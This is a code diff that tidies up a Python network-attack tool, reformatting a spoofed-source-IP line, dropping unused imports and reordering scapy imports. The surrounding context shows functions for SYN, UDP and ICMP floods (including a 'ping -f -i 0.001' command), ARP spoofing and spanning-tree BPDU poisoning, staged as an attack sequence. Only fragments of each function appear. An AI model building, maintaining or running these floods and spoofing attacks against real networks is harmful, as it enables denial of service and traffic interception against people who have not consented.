@@ -27,11 +27,8 @@ import random
 import socket
 import struct
 import subprocess
-import sys
-import threading
 import time
 from typing import Callable
-
 
 # ─── Helpers ────────────────────────────────────────────────────────────────
 
@@ -91,7 +88,10 @@ def syn_flood(target_ip: str, duration: int, target_port: int = 80) -> None:
     while time.time() < end_time:
         # Random source port and IP
         src_port = random.randint(1024, 65535)
-        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_ip = (
+            f"{random.randint(1,254)}.{random.randint(1,254)}."
+            f"{random.randint(1,254)}.{random.randint(1,254)}"
+        )
 
         # Build TCP SYN packet
         tcp_header = struct.pack(
@@ -159,7 +159,6 @@ def udp_flood(target_ip: str, duration: int, target_port: int = 53) -> None:
 def icmp_flood(target_ip: str, duration: int) -> None:
     """Stage 1: ICMP flood — high-rate echo requests."""
     print(f"[*] ICMP flood: {target_ip} for {duration}s")
-    end_time = time.time() + duration
 
     # Use ping with high rate
     cmd = f"ping -f -i 0.001 {target_ip}"
@@ -230,7 +229,7 @@ def arp_spoof(target_ip: str, duration: int) -> None:
         print("[!] scapy required for ARP spoof. Install with: pip install scapy")
         return
 
-    from scapy.all import ARP, Ether, sendp, conf
+    from scapy.all import ARP, Ether, conf, sendp
     conf.verb = 0
 
     end_time = time.time() + duration
@@ -292,7 +291,7 @@ def topo_poison(duration: int) -> None:
         print("[!] scapy required for BPDU poisoning. Install with: pip install scapy")
         return
 
-    from scapy.all import Ether, sendp, conf
+    from scapy.all import Ether, conf, sendp
     conf.verb = 0
 
     # 802.3 STP BPDU format
